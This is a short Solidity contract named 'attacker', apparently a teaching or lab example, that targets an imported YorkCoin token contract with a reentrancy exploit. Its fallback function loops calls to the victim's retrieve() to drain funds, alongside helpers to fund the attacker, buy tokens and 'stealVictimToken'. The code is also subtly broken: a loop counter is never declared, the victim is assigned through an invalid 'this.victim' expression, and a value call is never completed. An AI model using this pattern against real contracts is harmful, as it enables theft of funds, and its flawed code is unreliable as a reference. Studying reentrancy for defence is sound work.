pragma solidity 0.3.6;

import "./YorkCoin.sol";

contract attacker {

    address victim;
    
    function () {
        while (a<5) {
            a++;
            YorkCoin(victim).retrieve(this);
        }
    }
  
    function setVictim(address victim) public {
        this.victim = victim;
    }
    
    function fundMe() payable public {}
    
    function buyVictimToken(uint256 amount) public {
        YorkCoin(victim).store.value(amount);
    }
    
    function stealVictimToken() public {
        YorkCoin(victim).retrieve(this);
    }
}

